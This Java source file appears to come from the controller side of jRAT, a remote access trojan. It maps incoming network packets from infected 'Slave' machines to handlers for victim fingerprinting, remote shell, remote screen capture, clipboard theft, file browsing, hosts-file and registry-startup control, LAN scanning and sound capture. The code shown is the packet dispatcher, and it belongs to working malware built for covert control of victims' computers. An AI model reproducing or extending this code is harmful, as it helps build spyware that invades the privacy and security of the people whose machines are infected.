package se.jrat.controller.packets.incoming;

import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import se.jrat.common.PacketRange;
import se.jrat.controller.Slave;
import se.jrat.controller.addons.PluginEventHandler;


public class IncomingPackets {

	private static final Map<Byte, Class<? extends AbstractIncomingPacket>> PACKETS_INCOMING = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	public static Map<Byte, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
		return PACKETS_INCOMING;
	}

	static {
		reload();
	}

	private static void reload() {
		PACKETS_INCOMING.clear();
		
		PACKETS_INCOMING.put((byte) 2, Packet2Status.class);
		PACKETS_INCOMING.put((byte) 3, Packet3Initialized.class);
		PACKETS_INCOMING.put((byte) 4, Packet4InitOperatingSystem.class);
		PACKETS_INCOMING.put((byte) 5, Packet5InitUserHost.class);
		PACKETS_INCOMING.put((byte) 6, Packet6InitVersion.class);
		PACKETS_INCOMING.put((byte) 7, Packet7InitServerID.class); //
		PACKETS_INCOMING.put((byte) 8, Packet8InitCountry.class);
		PACKETS_INCOMING.put((byte) 9, Packet9InitJavaVersion.class);
		PACKETS_INCOMING.put((byte) 10, Packet10InitInstallPath.class);
		PACKETS_INCOMING.put((byte) 11, Packet11InitInstallationDate.class);
		PACKETS_INCOMING.put((byte) 12, Packet12InitLocalAddress.class);
		PACKETS_INCOMING.put((byte) 13, Packet13InitTotalMemory.class);
		PACKETS_INCOMING.put((byte) 14, Packet14InitAvailableCores.class);
		PACKETS_INCOMING.put((byte) 15, Packet15InitJavaPath.class);
		PACKETS_INCOMING.put((byte) 16, Packet16LoadedPlugins.class);
		PACKETS_INCOMING.put((byte) 17, Packet17InitDrives.class);
		PACKETS_INCOMING.put((byte) 18, Packet18InitMonitors.class);	
		PACKETS_INCOMING.put((byte) 19, Packet19InitCPU.class);
		PACKETS_INCOMING.put((byte) 20, Packet20Headless.class);
		PACKETS_INCOMING.put((byte) 21, Packet21RemoteShell.class);
		PACKETS_INCOMING.put((byte) 22, Packet22ListFiles.class);
		//23
		PACKETS_INCOMING.put((byte) 24, Packet24UsedMemory.class);
		PACKETS_INCOMING.put((byte) 25, Packet25Process.class);
		PACKETS_INCOMING.put((byte) 26, Packet26RemoteScreen.class);
		PACKETS_INCOMING.put((byte) 27, Packet27URLStatus.class);
		//28
		PACKETS_INCOMING.put((byte) 29, Packet29ServerDownloadPart.class);		
		PACKETS_INCOMING.put((byte) 30, Packet30BeginServerDownload.class);
		PACKETS_INCOMING.put((byte) 31, Packet31CompleteServerDownload.class);
		//32
		PACKETS_INCOMING.put((byte) 32, Packet32SystemProperties.class);
		PACKETS_INCOMING.put((byte) 33, Packet33Thumbnail.class);
		PACKETS_INCOMING.put((byte) 34, Packet34CustomDirectory.class);
		PACKETS_INCOMING.put((byte) 35, Packet35ChatMessage.class);	
		//36
		PACKETS_INCOMING.put((byte) 37, Packet37SearchResult.class);
		PACKETS_INCOMING.put((byte) 38, Packet38HostFile.class);
		PACKETS_INCOMING.put((byte) 39, Packet39HostEditResult.class);
		PACKETS_INCOMING.put((byte) 40, Packet40UTorrentDownload.class);
		PACKETS_INCOMING.put((byte) 41, Packet41Clipboard.class);
		PACKETS_INCOMING.put((byte) 42, Packet42PreviewFile.class);
		PACKETS_INCOMING.put((byte) 43, Packet43PreviewImage.class);
		PACKETS_INCOMING.put((byte) 44, Packet44SystemJavaProperty.class);
		PACKETS_INCOMING.put((byte) 45, Packet45ArchivePreview.class);
		PACKETS_INCOMING.put((byte) 46, Packet46FileHash.class);
		// 48
		PACKETS_INCOMING.put((byte) 49, Packet49LanDevices.class);
		PACKETS_INCOMING.put((byte) 50, Packet50IPConfig.class);
		PACKETS_INCOMING.put((byte) 51, Packet51ActivePort.class);
		PACKETS_INCOMING.put((byte) 52, Packet52WindowsService.class);
		PACKETS_INCOMING.put((byte) 53, Packet53RegistryStartup.class);
		PACKETS_INCOMING.put((byte) 54, Packet54Registry.class);
		PACKETS_INCOMING.put((byte) 55, Packet55InstalledProgram.class);
		PACKETS_INCOMING.put((byte) 56, Packet56NetworkAdapter.class);
		//57
		PACKETS_INCOMING.put((byte) 58, Packet58ServerDownloadSoundCapture.class);
		PACKETS_INCOMING.put((byte) 59, Packet59ThumbnailPreview.class);
		PACKETS_INCOMING.put((byte) 60, Packet60Error.class);		
		//61
		//62
		//63
		//64
		PACKETS_INCOMING.put((byte) 65, Packet65ErrorLog.class);
		PACKETS_INCOMING.put((byte) 66, Packet66Config.class);
		//67
		PACKETS_INCOMING.put((byte) 68, Packet68RemoteScreenComplete.class);	
		//69
		//70
		PACKETS_INCOMING.put((byte) 71, Packet71AllThumbnails.class);
	}

	public static boolean execute(byte header, Slave slave) {
		try {
			AbstractIncomingPacket ac = null;
			Set<Byte> set = PACKETS_INCOMING.keySet();

			for (Byte str : set) {
				if (str == header) {
					ac = PACKETS_INCOMING.get(str).newInstance();
					break;
				}
			}

			if (ac != null && header >= 0 && header <= PacketRange.RANGE_INCOMING) {
				ac.read(slave, slave.getDataInputStream());
			} else {
				PluginEventHandler.onPacket(slave, header);
			}

			return ac != null;
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
	}

}